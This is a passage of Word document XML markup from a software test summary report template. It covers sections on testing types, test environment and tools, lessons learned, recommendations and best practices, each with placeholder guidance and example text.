            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>&lt;Describe the various types of Testing performed for the Project. This will make sure the application is being tested properly through testing types agreed as per Test Strategy.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:rPr>
          <w:ins w:id="894" w:author="Unknown"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="895" w:author="Unknown">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Emphasis"/>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:b/>
            <w:bCs/>
            <w:color w:val="FF6600"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Note:</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Emphasis"/>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="FF6600"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t> If several rounds of Testing were done, the details can also be included here.&gt;</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:rPr>
          <w:ins w:id="896" w:author="Unknown"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="897" w:author="Unknown">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Emphasis"/>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:b/>
            <w:bCs/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Example: </w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:br/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>a) Smoke Testing</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:br/>
          <w:t>This testing was done whenever a Build is received </w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Emphasis"/>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>(deployed into Test environment)</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t> for Testing to make sure the major functionality are working fine, Build can be accepted and Testing can start.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:rPr>
          <w:ins w:id="898" w:author="Unknown"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="899" w:author="Unknown">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>b) System Integration Testing</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="125"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="900" w:author="Unknown"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="901" w:author="Unknown">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>This is the Testing performed on the Application under test, to verify the entire application works as per the requirements.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="125"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="902" w:author="Unknown"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="903" w:author="Unknown">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Critical Business scenarios were tested to make sure important functionality in the application works as intended without any errors.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:rPr>
          <w:ins w:id="904" w:author="Unknown"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="905" w:author="Unknown">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>c) Regression Testing</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="126"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="906" w:author="Unknown"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="907" w:author="Unknown">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Regression testing was performed each time a new build is deployed for testing which contains defect fixes and new enhancements, if any.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="126"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="908" w:author="Unknown"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="909" w:author="Unknown">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Regression Testing is being done on the entire application and not just the new functionality and Defect fixes.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="126"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="910" w:author="Unknown"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="911" w:author="Unknown">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>This testing ensures that existing functionality works fine after defect fix and new enhancements are added to the existing application.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="126"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="912" w:author="Unknown"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="913" w:author="Unknown">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Test cases for new functionality are added to the existing test cases and executed.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:rPr>
          <w:ins w:id="914" w:author="Unknown"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="915" w:author="Unknown">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Step #6: </w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:instrText xml:space="preserve"> HYPERLINK "http://www.softwaretestinghelp.com/test-bed-test-environment-management-best-practices/" \o "Test environment" </w:instrText>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:b/>
            <w:bCs/>
            <w:color w:val="777777"/>
            <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          </w:rPr>
          <w:t>Test Environment &amp; Tools</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:rPr>
          <w:ins w:id="916" w:author="Unknown"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="917" w:author="Unknown">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Emphasis"/>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="FF6600"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t xml:space="preserve">&lt;Provide details on Test Environment in which the Testing is carried out. </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Emphasis"/>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="FF6600"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Server, Database, Application URL etc.</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Emphasis"/>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="FF6600"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t xml:space="preserve"> If any Tools were used like Quality Center (now HP ALM) for logging defects&gt;</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:rPr>
          <w:ins w:id="918" w:author="Unknown"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="919" w:author="Unknown">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Emphasis"/>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:b/>
            <w:bCs/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:lastRenderedPageBreak/>
          <w:t>Example:</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:br/>
        </w:r>
      </w:ins>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:noProof/>
          <w:color w:val="777777"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="0402870B" wp14:editId="7003758E">
            <wp:extent cx="2743200" cy="889635"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="44" name="Picture 44" descr="test summary report 7">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st summary report 7">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43200" cy="88963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920" w:author="Unknown"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="921" w:author="Unknown">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Step #7: Lessons Learned</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:rPr>
          <w:ins w:id="922" w:author="Unknown"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="923" w:author="Unknown">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Emphasis"/>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="FF6600"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>&lt;This section is used to describe the critical issues faced and their solutions (how they were solved during the Testing). Lessons learnt will help to make proactive decisions during the next Testing engagement, by avoiding these mistakes or finding a suitable workaround&gt;</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:rPr>
          <w:ins w:id="924" w:author="Unknown"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="925" w:author="Unknown">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Emphasis"/>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:b/>
            <w:bCs/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Example:</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:br/>
        </w:r>
      </w:ins>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:noProof/>
          <w:color w:val="777777"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="7B65D49C" wp14:editId="0C9A6BB2">
            <wp:extent cx="4621530" cy="1721485"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="45" name="Picture 45" descr="test summary report 8">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 summary report 8">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21530" cy="1721485"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:rPr>
          <w:ins w:id="926" w:author="Unknown"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="927" w:author="Unknown">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Step #8: Recommendations</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:rPr>
          <w:ins w:id="928" w:author="Unknown"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="929" w:author="Unknown">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Emphasis"/>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="FF6600"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>&lt;Any workaround or suggestions can be mentioned here&gt;</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:rPr>
          <w:ins w:id="930" w:author="Unknown"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="931" w:author="Unknown">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Emphasis"/>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:b/>
            <w:bCs/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Example:</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="127"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="932" w:author="Unknown"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="933" w:author="Unknown">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Emphasis"/>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Admin control for defect management tool can be given to Offshore Test manager for providing access to Testing team.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="127"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="934" w:author="Unknown"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="935" w:author="Unknown">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Emphasis"/>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Each time the onsite Admin need not be contacted for requests whenever they arise, thereby saving time due to the geographical time zone difference.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:rPr>
          <w:ins w:id="936" w:author="Unknown"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="937" w:author="Unknown">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Step #9: Best Practices</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:rPr>
          <w:ins w:id="938" w:author="Unknown"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="939" w:author="Unknown">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Emphasis"/>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="FF6600"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>&lt;There will be lot of activities done by the Testing team during the project. Some of them could have saved time, some proved to be a good &amp; efficient way to work, etc. These can be documented as a ‘Value Add’ to show case to the Stakeholders&gt;</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
